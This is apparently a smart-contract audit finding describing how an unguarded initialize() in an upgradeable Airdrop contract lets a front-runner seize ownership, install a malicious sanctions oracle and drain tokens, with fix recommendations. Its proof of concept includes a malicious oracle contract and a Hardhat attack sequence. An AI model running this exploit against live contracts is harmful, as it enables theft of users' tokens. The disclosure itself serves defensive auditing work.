### Title
Unguarded `initialize()` Enables Front-Running to Seize Owner Role and Drain Tokens — (`core/contracts/Airdrop.sol`)

---

### Summary

`Airdrop.initialize()` is `external` with no caller restriction. Any actor who observes a pending proxy initialization transaction can front-run it, become the permanent owner, install a malicious sanctions oracle, register an arbitrary Merkle root, and drain all tokens held by the contract.

---

### Finding Description

`Airdrop` is an upgradeable proxy contract. Its constructor calls `_disableInitializers()`, which only locks the **implementation** contract's own storage — it does not prevent the proxy's storage from being initialized. [1](#0-0) 

`initialize()` is `external` with only the `initializer` modifier — no `onlyOwner`, no deployer check, no factory-gating. Any EOA can call it on an uninitialized proxy: [2](#0-1) 

`__Ownable_init()` sets `msg.sender` as owner, so the front-runner permanently owns the contract. The `initializer` guard then prevents any re-initialization, making the takeover irreversible. [3](#0-2) 

The `sanctions` address is stored as a plain `address` with no validation. `_verifyProof()` calls `ISanctionsList(sanctions).isSanctioned(sender)` directly: [4](#0-3) 

A malicious contract at `sanctions` can return `false` for the attacker (allowing claim) and `true` for all others (blocking legitimate users). The `ISanctionsList` interface requires only a single `isSanctioned(address)` view function: [5](#0-4) 

`registerMerkleRoot()` is `onlyOwner` — but the attacker is the owner: [6](#0-5) 

---

### Impact Explanation

- Attacker permanently holds the `owner` role; no recovery path exists (re-initialization is blocked).
- Attacker controls the `sanctions` oracle, bypassing the only non-Merkle guard in `_verifyProof()`.
- Attacker can register arbitrary Merkle roots and claim the full token balance of the proxy.
- Legitimate users can be permanently sanctioned by the malicious oracle, blocking their claims.

---

### Likelihood Explanation

The attack requires only a mempool observation and a higher-gas transaction. No privileged access, no leaked keys, no governance capture. It is executable by any MEV bot or manual attacker on any EVM chain where the proxy deployment and initialization are not atomic. The window exists whenever `initialize()` is called in a transaction separate from the proxy deployment.

---

### Recommendation

1. **Atomic initialization**: Pass the encoded `initialize()` calldata to the proxy constructor (`ERC1967Proxy(impl, initData)`), so deployment and initialization occur in a single transaction with no exploitable window.
2. **Deployer restriction**: Add a deployer/factory address check inside `initialize()`, or use OpenZeppelin's `Initializable` with a two-step pattern that restricts who may call `initialize()`.
3. **Validate `_sanctions`**: Require `_sanctions != address(0)` and consider an allowlist or immutable reference for the sanctions oracle.

---

### Proof of Concept

```solidity
// MaliciousSanctions.sol
contract MaliciousSanctions {
    address attacker;
    constructor(address _a) { attacker = _a; }
    function isSanctioned(address addr) external view returns (bool) {
        return addr != attacker; // blocks everyone except attacker
    }
}

// Attack sequence (Hardhat test)
const proxy = await deployProxy(Airdrop, []); // deploy uninitialized proxy

// Attacker front-runs the legitimate initialize() call:
await proxy.connect(attacker).initialize(realToken.address, maliciousSanctions.address);

assert((await proxy.owner()) === attacker.address);          // attacker is owner
assert((await proxy.sanctions()) === maliciousSanctions.address); // malicious oracle set

// Attacker registers a Merkle root containing themselves with large totalAmount
await proxy.connect(attacker).registerMerkleRoot(1, attackerMerkleRoot);

// Attacker claims — sanctions check passes (isSanctioned returns false for attacker)
await proxy.connect(attacker).claim([{ week: 1, totalAmount: FULL_BALANCE, proof: attackerProof }]);

// Token balance drained
assert((await token.balanceOf(attacker.address)) === FULL_BALANCE);
``` [2](#0-1) [7](#0-6)

### Citations

**File:** core/contracts/Airdrop.sol (L19-31)
```text
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function initialize(address _token, address _sanctions)
        external
        initializer
    {
        __Ownable_init();
        token = _token;
        sanctions = _sanctions;
    }
```

**File:** core/contracts/Airdrop.sol (L33-40)
```text
    function registerMerkleRoot(uint32 week, bytes32 merkleRoot)
        external
        onlyOwner
    {
        pastWeeks += 1;
        require(week == pastWeeks, "Invalid week provided.");
        merkleRoots[week] = merkleRoot;
    }
```

**File:** core/contracts/Airdrop.sol (L42-63)
```text
    function _verifyProof(
        uint32 week,
        address sender,
        uint256 totalAmount,
        bytes32[] calldata proof
    ) internal {
        require(claimed[week][sender] == 0, "Already claimed.");
        require(
            merkleRoots[week] != bytes32(0),
            "Week hasn't been registered."
        );
        require(
            !ISanctionsList(sanctions).isSanctioned(sender),
            "address is sanctioned."
        );
        bytes32 leaf = keccak256(
            bytes.concat(keccak256(abi.encode(sender, totalAmount)))
        );
        bool isValidLeaf = MerkleProof.verify(proof, merkleRoots[week], leaf);
        require(isValidLeaf, "Invalid proof.");
        claimed[week][sender] = totalAmount;
    }
```

**File:** core/contracts/EndpointStorage.sol (L14-16)
```text
interface ISanctionsList {
    function isSanctioned(address addr) external view returns (bool);
}
```
